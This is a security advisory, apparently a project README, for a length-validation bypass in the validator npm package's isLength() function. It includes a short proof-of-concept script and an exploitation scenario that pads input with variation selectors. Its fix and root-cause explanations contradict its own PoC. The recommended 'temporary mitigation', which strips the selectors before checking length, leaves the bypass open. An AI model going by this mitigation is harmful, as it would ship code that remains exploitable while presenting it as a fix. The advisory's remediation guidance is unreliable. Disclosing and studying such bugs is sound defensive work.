# CVE-2025-12758: Validator.js isLength() Unicode Variation Selector Bypass

**CVE ID:** CVE-2025-12758  
**CVSS Score:** 8.7 (HIGH)  
**Severity:** HIGH  
**CWE:** CWE-792 (Incomplete Filtering of One or More Instances of Special Elements)  
**Published:** November 26, 2025  
**Disclosed:** October 19, 2025  

## Vulnerability Overview

This vulnerability affects the `validator` npm package versions **< 13.15.22**. The `isLength()` function fails to account for Unicode variation selectors (`\uFE0F`, `\uFE0E`) when calculating string length, leading to improper input validation.

### Impact

An application using `isLength()` for input validation can accept strings significantly longer than intended, potentially resulting in:

- **Data truncation** in databases
- **Buffer overflows** in other system components
- **Denial-of-service (DoS)** attacks
- **Input validation bypass**

### Root Cause

The `isLength()` function does not properly filter out Unicode variation selectors when calculating string length. These special characters (combining marks) should not contribute to the visual length of a string but are counted in JavaScript's `String.length` property.

## Proof of Concept

### Setup

```bash
npm install validator@13.15.20
node poc.js
```

### Code

The POC demonstrates the vulnerability by testing the `isLength()` function:

```javascript
const validator = require('validator');

// Normal "test" string - correctly rejected
console.log(`Is "test" (String.length: ${'test'.length}) length ≤ 3? ${validator.isLength('test', { max: 3 })}`);
// Output: Is "test" (String.length: 4) length ≤ 3? false

// Normal "test" string - correctly accepted
console.log(`Is "test" (String.length: ${'test'.length}) length ≤ 4? ${validator.isLength('test', { max: 4 })}`);
// Output: Is "test" (String.length: 4) length ≤ 4? true

// "test" with 4 variation selectors - INCORRECTLY accepted
console.log(`Is "test️️️️" (String.length: ${'test\uFE0F\uFE0F\uFE0F\uFE0F'.length}) length ≤ 4? ${validator.isLength('test\uFE0F\uFE0F\uFE0F\uFE0F', { max: 4 })}`);
// Output: Is "test️️️️" (String.length: 8) length ≤ 4? true ⚠️ VULNERABLE!
```

### Output

```
Is "test" (String.length: 4) length less than or equal to 3? false
Is "test" (String.length: 4) length less than or equal to 4? true
Is "test️️️️" (String.length: 8) length less than or equal to 4? true
```

The third output demonstrates the vulnerability: a string with actual length 8 passes a validation check for maximum length 4.

## Exploitation Scenario

An application might implement user comment validation:

```javascript
const MAX_COMMENT_LENGTH = 100;

function validateComment(comment) {
  return validator.isLength(comment, { max: MAX_COMMENT_LENGTH });
}

const maliciousInput = 'a'.repeat(50) + '\uFE0F'.repeat(100);
// Actual length: 150 characters
// validator.isLength() incorrectly returns: true ❌
// Database accepts malicious payload ⚠️
```

## Fix

### Upgrade to Version 13.15.22 or Later

```bash
npm install validator@13.15.22
```

The patched version properly handles Unicode variation selectors by excluding them from length calculations.

### Alternative Mitigation (Temporary)

If you cannot immediately upgrade, implement custom length validation:

```javascript
function safeIsLength(str, options = {}) {
  // Remove Unicode variation selectors before validation
  const cleanStr = str.replace(/[\uFE0E\uFE0F]/g, '');
  return validator.isLength(cleanStr, options);
}
```

## References

- **Snyk Vulnerability Database:** https://security.snyk.io/vuln/SNYK-JS-VALIDATOR-13653476
- **GitHub Gist (Original Proof):** https://gist.github.com/koral--/ad31208b25b9e3d1e2e35f1d4d72572e
- **GitHub PR (Fix):** https://github.com/validatorjs/validator.js/pull/2616
- **CVE Record:** https://www.cve.org/CVERecord?id=CVE-2025-12758

## Detection

Check if your application is vulnerable:

```bash
npm audit --audit-level=high
```

Look for `validator` package with version < 13.15.22.

## Credit

Vulnerability discovered by: Karol Wrótniak

## License

ISC
